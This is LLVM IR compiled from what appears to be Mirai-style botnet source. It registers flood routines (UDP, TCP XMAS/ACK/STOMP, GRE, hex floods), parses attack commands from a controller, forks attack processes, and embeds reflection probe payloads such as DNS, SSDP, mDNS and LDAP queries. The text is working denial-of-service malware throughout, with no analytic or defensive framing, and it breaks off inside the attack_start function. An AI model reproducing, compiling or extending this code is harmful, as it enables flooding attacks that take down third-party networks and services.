; ModuleID = 'llvm-link'
source_filename = "llvm-link"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.udphdr = type { i16, i16, i16, i16 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.attack_xmas_data = type { i32, i32, i32, i16, i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.grehdr = type { i16, i16 }

@methods_len = dso_local global i8 0, align 1
@methods = dso_local global %struct.attack_method** null, align 8
@attack_ongoing = dso_local global [1 x i32] zeroinitializer, align 4
@.str = private unnamed_addr constant [1021 x i8] c"/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A\00", align 1
@hexPayload = dso_local global i8* getelementptr inbounds ([1021 x i8], [1021 x i8]* @.str, i32 0, i32 0), align 8
@__const.random_hex.hexs = private unnamed_addr constant [256 x i8] c"\00\01\02\03\04\05\06\07\08\09\0A\0B\0C\0D\0E\0F\10\11\12\13\14\15\16\17\18\19\1A\1B\1C\1D\1E\1F !\22#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\7F\80\81\82\83\84\85\86\87\88\89\8A\8B\8C\8D\8E\8F\90\91\92\93\94\95\96\97\98\99\9A\9B\9C\9D\9E\9F\A0\A1\A2\A3\A4\A5\A6\A7\A8\A9\AA\AB\AC\AD\AE\AF\B0\B1\B2\B3\B4\B5\B6\B7\B8\B9\BA\BB\BC\BD\BE\BF\C0\C1\C2\C3\C4\C5\C6\C7\C8\C9\CA\CB\CC\CD\CE\CF\D0\D1\D2\D3\D4\D5\D6\D7\D8\D9\DA\DB\DC\DD\DE\DF\E0\E1\E2\E3\E4\E5\E6\E7\E8\E9\EA\EB\EC\ED\EE\EF\F0\F1\F2\F3\F4\F5\F6\F7\F8\F9\FA\FB\FC\FD\FE\FF", align 16
@.str.1 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.2 = private unnamed_addr constant [31 x i8] c"\01\00\00\01\00\00\00\00\00\00\03www\06google\03com\00\00\01\00\01\00", align 1
@.str.3 = private unnamed_addr constant [31 x i8] c"\01\00\00\01\00\00\00\00\00\00\03www\06google\03com\00\00\05\00\01\00", align 1
@.str.4 = private unnamed_addr constant [41 x i8] c"r\FE\1D\13\00\00\00\00\00\00\00\02\00\01\86\A0\00\01\97|\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 1
@.str.5 = private unnamed_addr constant [49 x i8] c"\D9\00\0A\FA\00\00\00\00\00\01\02\90\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\C5\02\04\EC\ECB\EE\92\00", align 1
@.str.6 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.7 = private unnamed_addr constant [61 x i8] c"0:\02\01\030\0F\02\02Ji\02\03\00\FF\E3\04\01\04\02\01\03\04\100\0E\04\00\02\01\00\02\01\00\04\00\04\00\04\000\12\04\00\04\00\A0\0C\02\027\F0\02\01\00\02\01\000\00\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"\00\01\00\02\00\01\00\00", align 1
@.str.9 = private unnamed_addr constant [52 x i8] c"0\84\00\00\00-\02\01\07c\84\00\00\00$\04\00\0A\01\00\0A\01\00\02\01\00\02\01d\01\01\00\87\0BobjectClass0\84\00\00\00\00\00", align 1
@.str.10 = private unnamed_addr constant [54 x i8] c"\02\01\00\06 \00\00\00\00\00\01\00.n\00\00\00\15service:service-agent\00\07 default\00\00\00\00\00", align 1
@.str.11 = private unnamed_addr constant [157 x i8] c"\00\11\223DUfw\00\00\00\00\00\00\00\00\01\10\02\00\00\00\00\00\00\00\00\C0\00\00\00\A4\00\00\00\01\00\00\00\01\00\00\00\98\01\01\00\04\03\00\00$\01\01\00\00\80\01\00\05\80\02\00\02\80\03\00\01\80\04\00\02\80\0B\00\01\00\0C\00\04\00\00\00\01\03\00\00$\02\01\00\00\80\01\00\05\80\02\00\01\80\03\00\01\80\04\00\02\80\0B\00\01\00\0C\00\04\00\00\00\01\03\00\00$\03\01\00\00\80\01\00\01\80\02\00\02\80\03\00\01\80\04\00\02\80\0B\00\01\00\0C\00\04\00\00\00\01\00", align 1
@.str.12 = private unnamed_addr constant [25 x i8] c"\01\01\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\10\00", align 1
@.str.13 = private unnamed_addr constant [24 x i8] c"\06\00\FF\07\00\00\00\00\00\00\00\00\00\09 \18\C8\81\008\8E\04\B5\00", align 1
@.str.14 = private unnamed_addr constant [31 x i8] c"SNQUERY: 127.0.0.1:AAAAAA:xsvr\00", align 1
@.str.15 = private unnamed_addr constant [15 x i8] c"8d\C1x\01\B8\9B\CB\8F\00\00\00\00\00\00", align 1
@.str.16 = private unnamed_addr constant [2 x i8] c"\02\00", align 1
@.str.17 = private unnamed_addr constant [31 x i8] c"\1E\00\010\02\FD\A8\E3\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 1
@.str.18 = private unnamed_addr constant [174 x i8] c"M-SEARCH * HTTP/1.1\0D\0AHOST: 255.255.255.255:1900\0D\0AMAN: \22ssdp:discover\22\0D\0AMX: 1\0D\0AST: urn:dial-multiscreen-org:service:dial:1\0D\0AUSER-AGENT: Google Chrome/60.0.3112.90 Windows\0D\0A\0D\0A\00", align 1
@.str.19 = private unnamed_addr constant [47 x i8] c"\00\00\00\00\00\01\00\00\00\00\00\00\09_services\07_dns-sd\04_udp\05local\00\00\0C\00\01\00", align 1
@.str.20 = private unnamed_addr constant [182 x i8] c"xf4\BE\03\00\00\00\00\00\00\00\00\00\01\00\00\02x\BA\85\09TeamSpeak\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0AWindows XP\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\02\00\00\00 \00<\00\00\01\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\08nickname\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 1
@.str.21 = private unnamed_addr constant [163 x i8] c"\05\CA\7F\16\9C\11\F9\89\00\00\00\00\02\9Dt\8BE\AA{\EF\B9\9E\FE\AD\08\19\BA\CFA\E0\16\A22l\F3\CF\F4\8E<D\83\C8\8DQEo\90\95#>\00\97+\1Cq\B2N\C0a\F1\D7o\C5~\F6HR\BF\82j\A2;e\AA\18z\178\C3\81'\C3G\FC\A75\BA\FC\0F\9D\9Dr$\9D\FC\02\17mk\B1-r\C6\E3\17\1C\95\D9i\99W\CE\DD\DF\05\DC\03\94V\04:\14\E5\AD\9A+\140:#\A3%\AD\E8\E69\8A\85*\C6\DF\E5]-\A0/]\9C\D7+$\FB\B0\9C\C2\BA\89\B4\1B\17\A2\B6\00", align 1
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@table_key = dso_local global i32 -1287662771, align 4
@table = dso_local global [41 x %struct.table_value] zeroinitializer, align 16

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  call void @add_attack(i8 noundef zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_udpgeneric)
  call void @add_attack(i8 noundef zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_udpvse)
  call void @add_attack(i8 noundef zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_udpplain)
  call void @add_attack(i8 noundef zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_tcpxmas)
  call void @add_attack(i8 noundef zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_nudp)
  call void @add_attack(i8 noundef zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_tcpack)
  call void @add_attack(i8 noundef zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_tcpstomp)
  call void @add_attack(i8 noundef zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_std)
  call void @add_attack(i8 noundef zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_gre_ip)
  call void @add_attack(i8 noundef zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_stdhex)
  call void @add_attack(i8 noundef zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_udphex)
  ret i8 1
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal void @add_attack(i8 noundef zeroext %0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef %1) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 noundef 1, i64 noundef 16) #8
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = add nsw i32 %17, 1
  %19 = sext i32 %18 to i64
  %20 = mul i64 %19, 8
  %21 = call i8* @realloc(i8* noundef %15, i64 noundef %20) #8
  %22 = bitcast i8* %21 to %struct.attack_method**
  store %struct.attack_method** %22, %struct.attack_method*** @methods, align 8
  %23 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %24 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %25 = load i8, i8* @methods_len, align 1
  %26 = add i8 %25, 1
  store i8 %26, i8* @methods_len, align 1
  %27 = zext i8 %25 to i64
  %28 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %24, i64 %27
  store %struct.attack_method* %23, %struct.attack_method** %28, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64 noundef, i64 noundef) #1

; Function Attrs: nounwind
declare i8* @realloc(i8* noundef, i64 noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_kill_all() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  br label %2

2:                                                ; preds = %21, %0
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 1
  br i1 %4, label %5, label %24

5:                                                ; preds = %2
  %6 = load i32, i32* %1, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [1 x i32], [1 x i32]* @attack_ongoing, i64 0, i64 %7
  %9 = load i32, i32* %8, align 4
  %10 = icmp ne i32 %9, 0
  br i1 %10, label %11, label %17

11:                                               ; preds = %5
  %12 = load i32, i32* %1, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds [1 x i32], [1 x i32]* @attack_ongoing, i64 0, i64 %13
  %15 = load i32, i32* %14, align 4
  %16 = call i32 @kill(i32 noundef %15, i32 noundef 9) #8
  br label %17

17:                                               ; preds = %11, %5
  %18 = load i32, i32* %1, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [1 x i32], [1 x i32]* @attack_ongoing, i64 0, i64 %19
  store i32 0, i32* %20, align 4
  br label %21

21:                                               ; preds = %17
  %22 = load i32, i32* %1, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %1, align 4
  br label %2, !llvm.loop !6

24:                                               ; preds = %2
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32 noundef, i32 noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_parse(i8* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp ult i64 %14, 4
  br i1 %15, label %16, label %17

16:                                               ; preds = %2
  br label %220

17:                                               ; preds = %2
  %18 = load i8*, i8** %3, align 8
  %19 = bitcast i8* %18 to i32*
  %20 = load i32, i32* %19, align 4
  %21 = call i32 @ntohl(i32 noundef %20) #9
  store i32 %21, i32* %6, align 4
  %22 = load i8*, i8** %3, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 4
  store i8* %23, i8** %3, align 8
  %24 = load i32, i32* %4, align 4
  %25 = sext i32 %24 to i64
  %26 = sub i64 %25, 4
  %27 = trunc i64 %26 to i32
  store i32 %27, i32* %4, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %31

30:                                               ; preds = %17
  br label %220

31:                                               ; preds = %17
  %32 = load i8*, i8** %3, align 8
  %33 = getelementptr inbounds i8, i8* %32, i32 1
  store i8* %33, i8** %3, align 8
  %34 = load i8, i8* %32, align 1
  store i8 %34, i8* %7, align 1
  %35 = load i32, i32* %4, align 4
  %36 = sext i32 %35 to i64
  %37 = sub i64 %36, 1
  %38 = trunc i64 %37 to i32
  store i32 %38, i32* %4, align 4
  %39 = load i32, i32* %4, align 4
  %40 = icmp eq i32 %39, 0
  br i1 %40, label %41, label %42

41:                                               ; preds = %31
  br label %220

42:                                               ; preds = %31
  %43 = load i8*, i8** %3, align 8
  %44 = getelementptr inbounds i8, i8* %43, i32 1
  store i8* %44, i8** %3, align 8
  %45 = load i8, i8* %43, align 1
  store i8 %45, i8* %8, align 1
  %46 = load i32, i32* %4, align 4
  %47 = sext i32 %46 to i64
  %48 = sub i64 %47, 1
  %49 = trunc i64 %48 to i32
  store i32 %49, i32* %4, align 4
  %50 = load i8, i8* %8, align 1
  %51 = zext i8 %50 to i32
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %53, label %54

53:                                               ; preds = %42
  br label %220

54:                                               ; preds = %42
  %55 = load i32, i32* %4, align 4
  %56 = sext i32 %55 to i64
  %57 = load i8, i8* %8, align 1
  %58 = zext i8 %57 to i64
  %59 = mul i64 5, %58
  %60 = icmp ult i64 %56, %59
  br i1 %60, label %61, label %62

61:                                               ; preds = %54
  br label %220

62:                                               ; preds = %54
  %63 = load i8, i8* %8, align 1
  %64 = zext i8 %63 to i64
  %65 = call noalias i8* @calloc(i64 noundef %64, i64 noundef 24) #8
  %66 = bitcast i8* %65 to %struct.attack_target*
  store %struct.attack_target* %66, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  br label %67

67:                                               ; preds = %114, %62
  %68 = load i32, i32* %5, align 4
  %69 = load i8, i8* %8, align 1
  %70 = zext i8 %69 to i32
  %71 = icmp slt i32 %68, %70
  br i1 %71, label %72, label %117

72:                                               ; preds = %67
  %73 = load i8*, i8** %3, align 8
  %74 = bitcast i8* %73 to i32*
  %75 = load i32, i32* %74, align 4
  %76 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %77 = load i32, i32* %5, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %76, i64 %78
  %80 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %79, i32 0, i32 1
  store i32 %75, i32* %80, align 4
  %81 = load i8*, i8** %3, align 8
  %82 = getelementptr inbounds i8, i8* %81, i64 4
  store i8* %82, i8** %3, align 8
  %83 = load i8*, i8** %3, align 8
  %84 = getelementptr inbounds i8, i8* %83, i32 1
  store i8* %84, i8** %3, align 8
  %85 = load i8, i8* %83, align 1
  %86 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %87 = load i32, i32* %5, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %86, i64 %88
  %90 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %89, i32 0, i32 2
  store i8 %85, i8* %90, align 4
  %91 = load i32, i32* %4, align 4
  %92 = sext i32 %91 to i64
  %93 = sub i64 %92, 5
  %94 = trunc i64 %93 to i32
  store i32 %94, i32* %4, align 4
  %95 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %96 = load i32, i32* %5, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %95, i64 %97
  %99 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %98, i32 0, i32 0
  %100 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %99, i32 0, i32 0
  store i16 2, i16* %100, align 4
  %101 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %102 = load i32, i32* %5, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %101, i64 %103
  %105 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %104, i32 0, i32 1
  %106 = load i32, i32* %105, align 4
  %107 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %107, i64 %109
  %111 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %110, i32 0, i32 0
  %112 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %111, i32 0, i32 2
  %113 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %112, i32 0, i32 0
  store i32 %106, i32* %113, align 4
  br label %114

114:                                              ; preds = %72
  %115 = load i32, i32* %5, align 4
  %116 = add nsw i32 %115, 1
  store i32 %116, i32* %5, align 4
  br label %67, !llvm.loop !8

117:                                              ; preds = %67
  %118 = load i32, i32* %4, align 4
  %119 = sext i32 %118 to i64
  %120 = icmp ult i64 %119, 1
  br i1 %120, label %121, label %122

121:                                              ; preds = %117
  br label %220

122:                                              ; preds = %117
  %123 = load i8*, i8** %3, align 8
  %124 = getelementptr inbounds i8, i8* %123, i32 1
  store i8* %124, i8** %3, align 8
  %125 = load i8, i8* %123, align 1
  store i8 %125, i8* %9, align 1
  %126 = load i32, i32* %4, align 4
  %127 = sext i32 %126 to i64
  %128 = sub i64 %127, 1
  %129 = trunc i64 %128 to i32
  store i32 %129, i32* %4, align 4
  %130 = load i8, i8* %9, align 1
  %131 = zext i8 %130 to i32
  %132 = icmp sgt i32 %131, 0
  br i1 %132, label %133, label %212

133:                                              ; preds = %122
  %134 = load i8, i8* %9, align 1
  %135 = zext i8 %134 to i64
  %136 = call noalias i8* @calloc(i64 noundef %135, i64 noundef 16) #8
  %137 = bitcast i8* %136 to %struct.attack_option*
  store %struct.attack_option* %137, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  br label %138

138:                                              ; preds = %208, %133
  %139 = load i32, i32* %5, align 4
  %140 = load i8, i8* %9, align 1
  %141 = zext i8 %140 to i32
  %142 = icmp slt i32 %139, %141
  br i1 %142, label %143, label %211

143:                                              ; preds = %138
  %144 = load i32, i32* %4, align 4
  %145 = sext i32 %144 to i64
  %146 = icmp ult i64 %145, 1
  br i1 %146, label %147, label %148

147:                                              ; preds = %143
  br label %220

148:                                              ; preds = %143
  %149 = load i8*, i8** %3, align 8
  %150 = getelementptr inbounds i8, i8* %149, i32 1
  store i8* %150, i8** %3, align 8
  %151 = load i8, i8* %149, align 1
  %152 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %153 = load i32, i32* %5, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %152, i64 %154
  %156 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %155, i32 0, i32 1
  store i8 %151, i8* %156, align 8
  %157 = load i32, i32* %4, align 4
  %158 = sext i32 %157 to i64
  %159 = sub i64 %158, 1
  %160 = trunc i64 %159 to i32
  store i32 %160, i32* %4, align 4
  %161 = load i32, i32* %4, align 4
  %162 = sext i32 %161 to i64
  %163 = icmp ult i64 %162, 1
  br i1 %163, label %164, label %165

164:                                              ; preds = %148
  br label %220

165:                                              ; preds = %148
  %166 = load i8*, i8** %3, align 8
  %167 = getelementptr inbounds i8, i8* %166, i32 1
  store i8* %167, i8** %3, align 8
  %168 = load i8, i8* %166, align 1
  store i8 %168, i8* %12, align 1
  %169 = load i32, i32* %4, align 4
  %170 = sext i32 %169 to i64
  %171 = sub i64 %170, 1
  %172 = trunc i64 %171 to i32
  store i32 %172, i32* %4, align 4
  %173 = load i32, i32* %4, align 4
  %174 = load i8, i8* %12, align 1
  %175 = zext i8 %174 to i32
  %176 = icmp slt i32 %173, %175
  br i1 %176, label %177, label %178

177:                                              ; preds = %165
  br label %220

178:                                              ; preds = %165
  %179 = load i8, i8* %12, align 1
  %180 = zext i8 %179 to i32
  %181 = add nsw i32 %180, 1
  %182 = sext i32 %181 to i64
  %183 = call noalias i8* @calloc(i64 noundef %182, i64 noundef 1) #8
  %184 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %185 = load i32, i32* %5, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %184, i64 %186
  %188 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %187, i32 0, i32 0
  store i8* %183, i8** %188, align 8
  %189 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %190 = load i32, i32* %5, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %189, i64 %191
  %193 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %192, i32 0, i32 0
  %194 = load i8*, i8** %193, align 8
  %195 = load i8*, i8** %3, align 8
  %196 = load i8, i8* %12, align 1
  %197 = zext i8 %196 to i32
  %198 = call i32 (i8*, i8*, i32, ...) bitcast (void (i8*, i8*, i32)* @util_memcpy to i32 (i8*, i8*, i32, ...)*)(i8* noundef %194, i8* noundef %195, i32 noundef %197)
  %199 = load i8, i8* %12, align 1
  %200 = zext i8 %199 to i32
  %201 = load i8*, i8** %3, align 8
  %202 = sext i32 %200 to i64
  %203 = getelementptr inbounds i8, i8* %201, i64 %202
  store i8* %203, i8** %3, align 8
  %204 = load i8, i8* %12, align 1
  %205 = zext i8 %204 to i32
  %206 = load i32, i32* %4, align 4
  %207 = sub nsw i32 %206, %205
  store i32 %207, i32* %4, align 4
  br label %208

208:                                              ; preds = %178
  %209 = load i32, i32* %5, align 4
  %210 = add nsw i32 %209, 1
  store i32 %210, i32* %5, align 4
  br label %138, !llvm.loop !9

211:                                              ; preds = %138
  br label %212

212:                                              ; preds = %211, %122
  %213 = call i32* @__errno_location() #9
  store i32 0, i32* %213, align 4
  %214 = load i32, i32* %6, align 4
  %215 = load i8, i8* %7, align 1
  %216 = load i8, i8* %8, align 1
  %217 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %218 = load i8, i8* %9, align 1
  %219 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 noundef %214, i8 noundef zeroext %215, i8 noundef zeroext %216, %struct.attack_target* noundef %217, i8 noundef zeroext %218, %struct.attack_option* noundef %219)
  br label %220

220:                                              ; preds = %212, %177, %164, %147, %121, %61, %53, %41, %30, %16
  %221 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %222 = icmp ne %struct.attack_target* %221, null
  br i1 %222, label %223, label %226

223:                                              ; preds = %220
  %224 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %225 = bitcast %struct.attack_target* %224 to i8*
  call void @free(i8* noundef %225) #8
  br label %226

226:                                              ; preds = %223, %220
  %227 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %228 = icmp ne %struct.attack_option* %227, null
  br i1 %228, label %229, label %233

229:                                              ; preds = %226
  %230 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %231 = load i8, i8* %9, align 1
  %232 = zext i8 %231 to i32
  call void @free_opts(%struct.attack_option* noundef %230, i32 noundef %232)
  br label %233

233:                                              ; preds = %229, %226
  ret void
}

; Function Attrs: nounwind readnone willreturn
declare i32 @ntohl(i32 noundef) #2

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_start(i32 noundef %0, i8 noundef zeroext %1, i8 noundef zeroext %2, %struct.attack_target* noundef %3, i8 noundef zeroext %4, %struct.attack_option* noundef %5) #0 {
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %16 = call i32 @fork() #8
  store i32 %16, i32* %13, align 4
  %17 = load i32, i32* %13, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %22, label %19

19:                                               ; preds = %6
  %20 = load i32, i32* %13, align 4
  %21 = icmp sgt i32 %20, 0
  br i1 %21, label %22, label %23

22:                                               ; preds = %19, %6
  ret void

23:                                               ; preds = %19
  %24 = call i32 @fork() #8
  store i32 %24, i32* %14, align 4
  %25 = load i32, i32* %14, align 4
  %26 = icmp eq i32 %25, -1
  br i1 %26, label %27, label %28

27:                                               ; preds = %23
  call void @exit(i32 noundef 0) #10
  unreachable

28:                                               ; preds = %23
  %29 = load i32, i32* %14, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %36

31:                                               ; preds = %28
  %32 = load i32, i32* %7, align 4
  %33 = call i32 @sleep(i32 noundef %32)
  %34 = call i32 @getppid() #8
  %35 = call i32 @kill(i32 noundef %34, i32 noundef 9) #8
  call void @exit(i32 noundef 0) #10
  unreachable

36:                                               ; preds = %28
  store i32 0, i32* %15, align 4
